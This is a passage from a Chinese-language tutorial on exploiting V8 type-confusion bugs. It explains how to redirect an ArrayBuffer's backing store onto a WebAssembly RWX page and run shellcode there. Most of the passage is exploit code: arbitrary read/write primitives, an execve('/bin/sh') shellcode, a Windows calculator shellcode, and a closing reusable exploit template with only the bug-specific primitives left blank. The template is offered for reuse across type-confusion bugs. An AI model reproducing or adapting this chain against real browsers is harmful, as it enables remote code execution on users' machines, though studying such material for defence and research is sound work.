+0x2ead0804976c: 0x0000555c12bb9050 0x0000000000000000
+0x2ead0804977c: 0x0000000000000000 0x0000000000000000
+```
+
+发现`backing_store`的地址属于`data_buf + 0x1C`，这个偏移在不同版本的v8中也是有一些区别的，所以写exp的时候，可以根据上面的步骤来进行计算。
+
+根据上述的思路，我们可以写出`copy_shellcode_to_rwx`函数：
+
+```assembly
+function copy_shellcode_to_rwx(shellcode, rwx_addr)
+{
+  var data_buf = new ArrayBuffer(shellcode.length * 8);
+  var data_view = new DataView(data_buf);
+  var buf_backing_store_addr_lo = addressOf(data_buf) + 0x18n;
+  var buf_backing_store_addr_up = buf_backing_store_addr_lo + 0x8n;
+  var lov = d2u(read64(buf_backing_store_addr_lo))[0];
+  var rwx_page_addr_lo = u2d(lov, d2u(rwx_addr)[0]);
+  var hiv = d2u(read64(buf_backing_store_addr_up))[1];
+  var rwx_page_addr_hi = u2d(d2u(rwx_addr, hiv)[1]);
+  var buf_backing_store_addr = ftoi(u2d(lov, hiv));
+  console.log("buf_backing_store_addr: 0x"+hex(buf_backing_store_addr));
+
+  write64(buf_backing_store_addr_lo, ftoi(rwx_page_addr_lo));
+  write64(buf_backing_store_addr_up, ftoi(rwx_page_addr_hi));
+  for (let i = 0; i < shellcode.length; ++i)
+    data_view.setFloat64(i * 8, itof(shellcode[i]), true);
+}
+```
+
+## 利用
+
+在linux环境下，我们测试的时候想执行一下`execve(/bin/sh,0,0)`的shellcode，就可以这样：
+
+```assembly
+var shellcode = [
+  0x2fbb485299583b6an,
+  0x5368732f6e69622fn,
+  0x050f5e5457525f54n
+];
+copy_shellcode_to_rwx(shellcode, rwx_page_addr);
+f();
+```
+
+如果想执行windows的弹计算器的shellcode，代码只需要改shellcode变量的值就好了，其他的就不用修改了：
+
+```assembly
+var shellcode = [
+    0xc0e8f0e48348fcn,
+    0x5152504151410000n,
+    0x528b4865d2314856n,
+    0x528b4818528b4860n,
+    0xb70f4850728b4820n,
+    0xc03148c9314d4a4an,
+    0x41202c027c613cacn,
+    0xede2c101410dc9c1n,
+    0x8b20528b48514152n,
+    0x88808bd001483c42n,
+    0x6774c08548000000n,
+    0x4418488b50d00148n,
+    0x56e3d0014920408bn,
+    0x4888348b41c9ff48n,
+    0xc03148c9314dd601n,
+    0xc101410dc9c141acn,
+    0x244c034cf175e038n,
+    0x4458d875d1394508n,
+    0x4166d0014924408bn,
+    0x491c408b44480c8bn,
+    0x14888048b41d001n,
+    0x5a595e58415841d0n,
+    0x83485a4159415841n,
+    0x4158e0ff524120ecn,
+    0xff57e9128b485a59n,
+    0x1ba485dffffn,
+    0x8d8d480000000000n,
+    0x8b31ba4100000101n,
+    0xa2b5f0bbd5ff876fn,
+    0xff9dbd95a6ba4156n,
+    0x7c063c28c48348d5n,
+    0x47bb0575e0fb800an,
+    0x894159006a6f7213n,
+    0x2e636c6163d5ffdan,
+    0x657865n,
+];
+copy_shellcode_to_rwx(shellcode, rwx_page_addr);
+f();
+```
+
+## 其他
+
+在上面的示例代码中，出现了几个没说明的函数，以下是这几个函数的代码：
+
+```assembly
+var f64 = new Float64Array(1);
+var bigUint64 = new BigUint64Array(f64.buffer);
+var u32 = new Uint32Array(f64.buffer);
+
+function ftoi(f)
+{
+  f64[0] = f;
+    return bigUint64[0];
+}
+
+function itof(i)
+{
+    bigUint64[0] = i;
+    return f64[0];
+}
+
+function u2d(lo, hi) {
+  u32[0] = lo;
+  u32[1] = hi;
+  return f64[0];
+}
+
+function d2u(v) {
+  f64[0] = v;
+  return u32;
+}
+```
+
+因为在上述思路中，都是使用浮点型数组，其值为浮点型，但是浮点型的值我们看着不顺眼，设置值我们也是习惯使用十六进制值。所以需要有`ftoi`和`itof`来进行浮点型和64bit的整数互相转换。
+
+但是因为在新版的v8中，有压缩高32bit地址的特性，所以还需要`u2d`和`d2u`两个，把浮点型和32bit整数进行互相转换的函数。
+
+最后还有一个`hex`函数，就是方便我们查看值：
+
+```assembly
+function hex(i)
+{
+    return i.toString(16).padStart(8, "0");
+}
+```
+
+# 总结
+
+目前看来，不说所有v8的漏洞，但是所有类型混淆类的漏洞都能使用同一套模板：
+
+```assembly
+var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
+var wasmModule = new WebAssembly.Module(wasmCode);
+var wasmInstance = new WebAssembly.Instance(wasmModule, {});
+var f = wasmInstance.exports.main;
+
+var f64 = new Float64Array(1);
+var bigUint64 = new BigUint64Array(f64.buffer);
+var u32 = new Uint32Array(f64.buffer);
+
+function d2u(v) {
+  f64[0] = v;
+  return u32;
+}
+function u2d(lo, hi) {
+  u32[0] = lo;
+  u32[1] = hi;
+  return f64[0];
+}
+function ftoi(f)
+{
+  f64[0] = f;
+    return bigUint64[0];
+}
+function itof(i)
+{
+    bigUint64[0] = i;
+    return f64[0];
+}
+function hex(i)
+{
+    return i.toString(16).padStart(8, "0");
+}
+
+function fakeObj(addr_to_fake)
+{
+    ?
+}
+
+function addressOf(obj_to_leak)
+{
+    ?
+}
+
+function read64(addr)
+{
+    fake_array[1] = itof(addr - 0x8n + 0x1n);
+    return fake_object[0];
+}
+
+function write64(addr, data)
+{
+    fake_array[1] = itof(addr - 0x8n + 0x1n);
+    fake_object[0] = itof(data);
+}
+
+function copy_shellcode_to_rwx(shellcode, rwx_addr)
+{
+  var data_buf = new ArrayBuffer(shellcode.length * 8);
+  var data_view = new DataView(data_buf);
+  var buf_backing_store_addr_lo = addressOf(data_buf) + 0x18n;
+  var buf_backing_store_addr_up = buf_backing_store_addr_lo + 0x8n;
+  var lov = d2u(read64(buf_backing_store_addr_lo))[0];
+  var rwx_page_addr_lo = u2d(lov, d2u(rwx_addr)[0]);
+  var hiv = d2u(read64(buf_backing_store_addr_up))[1];
+  var rwx_page_addr_hi = u2d(d2u(rwx_addr, hiv)[1]);
+  var buf_backing_store_addr = ftoi(u2d(lov, hiv));
+  console.log("[*] buf_backing_store_addr: 0x"+hex(buf_backing_store_addr));
+
+  write64(buf_backing_store_addr_lo, ftoi(rwx_page_addr_lo));
+  write64(buf_backing_store_addr_up, ftoi(rwx_page_addr_hi));
+  for (let i = 0; i < shellcode.length; ++i)
+    data_view.setFloat64(i * 8, itof(shellcode[i]), true);
+}
+
+var double_array = [1.1];
+var obj = {"a" : 1};
+var obj_array = [obj];
+var array_map = ?;
+var obj_map = ?;
+
+var fake_array = [
+  array_map,
+  itof(0x4141414141414141n)
+];
+
+fake_array_addr = addressOf(fake_array);
+console.log("[*] leak fake_array addr: 0x" + hex(fake_array_addr));
+fake_object_addr = fake_array_addr - 0x10n;
+var fake_object = fakeObj(fake_object_addr);
+var wasm_instance_addr = addressOf(wasmInstance);
+console.log("[*] leak wasm_instance addr: 0x" + hex(wasm_instance_addr));
+var rwx_page_addr = read64(wasm_instance_addr + 0x68n);
+console.log("[*] leak rwx_page_addr: 0x" + hex(ftoi(rwx_page_addr)));
+
+var shellcode = [
+  0x2fbb485299583b6an,
+  0x5368732f6e69622fn,
+  0x050f5e5457525f54n
+];
+
+copy_shellcode_to_rwx(shellcode, rwx_page_addr);
+f();
+```
+
+其中打问号的地方，需要根据具体情况来编写，然后就是有些偏移需要根据v8版本情况进行修改，但是主体结构基本雷同。
